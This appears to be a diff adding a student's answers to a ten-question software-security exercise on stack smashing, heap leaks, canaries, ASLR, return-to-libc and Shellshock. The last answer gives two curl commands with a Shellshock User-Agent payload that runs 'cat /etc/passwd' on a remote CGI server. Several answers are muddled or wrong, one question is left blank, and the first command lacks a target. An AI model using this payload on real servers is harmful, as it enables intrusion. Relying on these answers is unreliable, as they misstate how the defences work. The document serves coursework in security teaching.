@@ -1,0 +1,48 @@
+1/10) Is the program leak.c vulnerable to a buffer overflow of type stack smashing/control hijacking?
+(If yes why, if no why)
+
+No it is not. TO have a stack smashing attack the attacker needs to write on some addresses on the stack with the purpose of injecting some malicious code or cause a segmantation fault. 
+
+2/10) Is the program leak.c vulnerable to a buffer overflow of type information exfiltration?
+(If yes why, if no why)
+
+Yes. In this case the attacker could use a smaller size of the buffer given in input to perform an heap exfiltration, since if the space available on the buffer is smaller than the one that is allocated with the malloc, then is possible to read the content of the heap using the printf.
+
+3/10) Is the program leak.c vulnerable if stack protectors (canaries) are in place?
+(If yes why, if no why)
+Yes it is, since the program does not overrite any address value. The canary address infact needs to be modified to be activated.
+
+4/10) Can not executable stack prevent the return loop in loop3.c?
+(If yes why, if no why)
+No it can not, since any malicious code is injected in the stack to be executed. The loop infact simply ovverrites the return address in order to call the function loop every time, causing a segmantation fault. The executable stack is indeed effective if we would have changed the return address to point to any maliciuos shell code to be executed in the stack.
+
+5/10) Can stack protectors (canaries) prevent the return loop in loop3.c?
+(If yes why, if no why)
+Stack protectors are usually placed in addresses before the return adddress, and if modified are really effective to prevent attacks. In this case the function only modifies the return address so the canary would not be changed.
+
+6/10) Can ASLR prevent the return loop in loop3.c?
+(If yes why, if no why)
+ASLR can not prevent the loop since the randomization does not change the order between the addresses but randomizes only the global positioning in the stack. So the index used in the function will be effective in any case.
+
+Let's make the Hypothesis that there is no "system" function call in the libc library
+7/10) Is it still possible to make a Return Oriented Programming attack?
+(If yes why, if no why)
+
+Let's make the Hypothesis that there is no "system" function call in the libc library
+8/10) Is it possible to make a return to libc attack that activates any program that is present on the system?
+(If yes why, if no why, are there any restrictions)
+
+Yes, is still possible using the exec() family function , like the execve(), which can run any command in the system. In this case we need then to convert in assembly the three arguments of the functions, so the attack would be more difficult to perform , but is still possible 
+
+
+9/10) Does ASLR protect from a return to libc attack?
+(If yes why, if no why)
+The ASLR is very useful to counter the return to libc attack since it randomizes the addresses. By the way it is still possible to beat this solution, simply running the program in a loop, so doing a "brute force". In a 32 bit operative system the ASLR will be beaten in 19 minutes
+
+Assume you know the address of a http server with the shellshock vulnerability and a myCommand CGI program available (in the default CGI-BIN folder).
+10/10) Write the curl command that makes an http request that exploits the shellshock vulnerability and executes the "cat /etc/passwd" command redirecting the output to a file named pippo.txt in the folder /tmp on the remote server
+
+curl -A "() { echo hello;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd > tmp/pippo.txt"
+
+Michele's version:
+curl -A "() { echo hello;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd > /tmp/pippo.txt" http://address/cgi-bin/myCommand.cgi
